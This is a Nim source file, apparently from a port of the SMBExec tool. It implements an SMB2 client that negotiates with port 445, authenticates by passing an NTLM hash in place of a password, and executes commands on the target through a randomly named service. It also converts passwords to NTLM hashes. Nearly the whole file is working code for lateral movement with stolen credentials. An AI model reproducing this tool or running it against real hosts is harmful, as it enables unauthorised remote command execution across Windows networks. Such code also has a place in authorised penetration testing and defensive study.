import net, strutils, hashlib/rhash/md4, encodings, random

import SMBExec/[SMBv1, SMBv2, NTLM, HelpUtil, ExecStages]

type
    SMB2* = ref object
        socket*:      Socket
        target*:      string
        domain*:      string
        user*:        string
        hash*:        string
        serviceName*: string

proc recvPacketForNTLM(socket: Socket, bufSize, timeout: int): string =
    var buf: string
    try:
        while socket.recv(buf, 1, timeout) > 0:
            result.add(buf)
    except:
        discard

proc randomServiceName: string =
  for _ in .. 5:
    add(result, char(rand(int('A') .. int('Z'))))

proc newSMB2*(target: string, domain: string, user: string, hash: string, serviceName: string = ""): SMB2 =
    var newServiceName = serviceName
    if serviceName == "":
        newServiceName = randomServiceName()
    echo newServiceName
    result = SMB2(socket: newSocket(), target: target, domain: domain, user: user, hash: hash, serviceName: newServiceName)

proc connect*(smb: SMB2): seq[string] =
    var 
        recvClient: seq[string]
        response: string
    
    ## Connect
    smb.socket.connect(smb.target, 445.Port)

    ## SMBv1 Init negotiate
    smb.socket.send(getSMBv1NegoPacket())
    recvClient = smb.socket.recvPacket(1024, 100)

    ## Check Dialect
    printC(Info, "Dialect: " & checkDialect recvClient)

    ## Check Signing
    signing = checkSigning recvClient
    if signing:
        printC Info, "Signing Enabled"
    else:
        printC Info, "Signing Disabled"

    ## SMBv2 negotiate
    smb.socket.send(getSMBv2NegoPacket())
    recvClient = smb.socket.recvPacket(1024, 100)

    ## SMBv2NTLM negotiate
    smb.socket.send(getSMBv2NTLMNego(signing))
    response = smb.socket.recvPacketForNTLM(1024, 100)

    ## Pass the hash
    let authPacket = getSMBv2NTLMAuth(getSMBv2NTLMSSP(response, smb.hash, smb.domain, smb.user, signing)) 

    smb.socket.send(authPacket)
    recvClient = smb.socket.recvPacket(1024, 100)

    if checkAuth recvClient:
        printC Success, "Successfully logged on!"
        stage = TreeConnect
    else:
        printC Error, "Login failed"
        stage = Exit

    result = recvClient

proc exec*(smb: SMB2, command: string, recvClient: seq[string]) =
    execStages(smb.target, smb.serviceName, command, smb.socket, recvClient)

proc close*(smb: SMB2) =
    smb.socket.close()

proc toNTLMHash*(password: string): string =
    # Counts the hash for empty string, returns a RHASH_MD4 object
    var hash = count[RHASH_MD4](password.convert("UTF-16"))

    return $hash